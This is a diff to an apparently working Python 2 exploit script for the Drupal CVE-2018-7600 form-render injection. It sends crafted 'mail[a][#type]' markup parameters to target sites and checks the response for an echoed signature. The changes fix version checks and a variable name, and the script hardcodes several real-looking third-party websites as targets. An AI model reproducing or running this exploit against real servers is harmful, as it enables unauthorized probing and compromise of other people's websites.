@@ -28,9 +28,9 @@ def processRedirectedURL(url,version):
     if(form_id in url):
         print "Case form in url"
         url = url[:-14]
-        if(version is 8):
+        if(version is '8'):
             return exploitD8(url)
-        elif(version is 7):
+        elif(version is '7'):
             return exploitD7Clean(url)
         else:
             return False
@@ -133,11 +133,11 @@ def exploitD8(host):
                     'mail[a][#type]': 'markup',
                     'mail[a][#markup]': 'echo ' + signature}
     try:
-        r = requests.post(url, data=post_params, verify=False, timeout = 50)
+        res= requests.post(url, data=post_params, verify=False, timeout = 50)
     except Exception as e:
         print e
         return False
-    detect = bool(re.search(signature, r.text))
+    detect = bool(re.search(signature, res.text))
     n = bool(re.search('echo ' + signature, res.text))
     if detect and not n:
         return True
@@ -182,6 +182,7 @@ def check_CVE_7600(host, version):
 
 
 host = 'http://lythuyetlaixe.com/'
+host = 'http://paradise-mass.lviv.ua/'
 # host = 'http://192.168.210.133'
 # # # host = 'https://whatchareadin.de'
 # # # host = 'http://autoshares.com/'
